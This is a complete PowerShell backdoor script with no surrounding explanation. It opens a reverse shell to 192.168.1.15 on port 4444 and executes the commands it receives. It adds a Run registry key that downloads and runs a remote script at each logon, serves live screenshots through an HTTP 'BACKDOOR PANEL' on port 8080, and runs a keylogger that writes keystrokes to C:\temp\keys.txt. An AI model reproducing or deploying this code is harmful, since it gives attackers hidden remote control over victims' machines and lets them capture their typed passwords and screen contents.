$a = "System.Net.Sockets."; $b = "TCPClient"; $c = New-Object ($a + $b)("192.168.1.15", 4444); $s = $c.GetStream(); [byte[]]$b_arr = 0..65535|%{0}; $m = ([text.encoding]::ASCII).GetBytes("v2 BACKDOOR LOADED`nPersistence+HTTP+Keys ACTIVE`nPS " + (pwd).Path + "> "); $s.Write($m,0,$m.Length);

$regcmd = 'powershell -w h -nop -c "IEX(New-Object Net.WebClient).DownloadString(`"https://YOUR_GITHUB/shell.ps1`")"';
Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdateSvc' -Value $regcmd -Force;

$url = 'http://*:8080/';
Start-Job -ScriptBlock { $l=New-Object Net.HttpListener;$l.Prefixes.Add($using:url);$l.Start();$h='<html><h1>BACKDOOR PANEL</h1><img src="/screen" width=800>';while($l.IsListening){$ctx=$l.GetContext();$req=$ctx.Request.Url.PathAndQuery;if($req -eq '/screen'){Add-Type -A System.Drawing;$b=[Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object Drawing.Bitmap($b.Width,$b.Height);$g=[Drawing.Graphics]::FromImage($bmp);$g.CopyFromScreen($b.X,$b.Y,0,0,$b.Size);$ms=New-Object IO.MemoryStream;$bmp.Save($ms,[Drawing.Imaging.ImageFormat]::Jpeg);$ctx.Response.ContentType='image/jpeg';$ctx.Response.ContentLength64=$ms.Length;$ms.Position=0;$ms.CopyTo($ctx.Response.OutputStream)}else{$ctx.Response.ContentType='text/html';$buf=[Text.Encoding]::UTF8.GetBytes($h);$ctx.Response.ContentLength64=$buf.Length;$ctx.Response.OutputStream.Write($buf,0,$buf.Length)};$ctx.Response.Close()}} | Out-Null;

if(!(Test-Path 'C:\temp')){mkdir C:\temp}; Start-Job -ScriptBlock {Add-Type @"using System;using System.Runtime.InteropServices;using System.IO;public class KeyLog{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int vKey);public static void Capture(){while(true){for(int i=0;i<255;i++){if(GetAsyncKeyState(i)==-32767){try{File.AppendAllText(@"C:\temp\keys.txt",((char)i).ToString());}catch{}}}System.Threading.Thread.Sleep(5);}}}"@;[KeyLog]::Capture()} | Out-Null;

while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
    $d = [text.encoding]::ASCII.GetString($b_arr,0, $i)
    try { $sb = (Invoke-Expression $d 2>&1 | Out-String) } catch { $sb = $_.Exception.Message }
    $out = $sb + "PS " + (pwd).Path + "> "
    $m = ([text.encoding]::ASCII).GetBytes($out)
    $s.Write($m,0,$m.Length)
    $s.Flush()
}
$c.Close()
